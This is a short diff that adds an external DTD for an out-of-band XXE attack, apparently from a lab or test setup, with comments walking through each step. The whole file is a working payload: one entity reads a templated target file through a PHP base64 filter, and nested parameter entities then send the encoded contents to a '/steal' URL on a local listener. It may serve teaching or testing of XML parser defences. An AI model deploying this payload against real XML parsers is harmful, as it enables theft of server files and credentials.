@@ -1,0 +1,11 @@
+<!-- §5.3 - external DTD for the out-of-band channel.
+     %file  reads the target and base64-encodes it (newlines and & would
+            otherwise terminate or corrupt the URI).
+     %eval  expands to a *declaration* of %exfil; &#x25; is a literal '%',
+            required because a bare % inside an entity value is a reference.
+     %exfil is then dereferenced, and resolving it makes the parser fetch a
+            URL carrying the stolen bytes. -->
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={{TARGET}}">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8123/steal?d=%file;'>">
+%eval;
+%exfil;
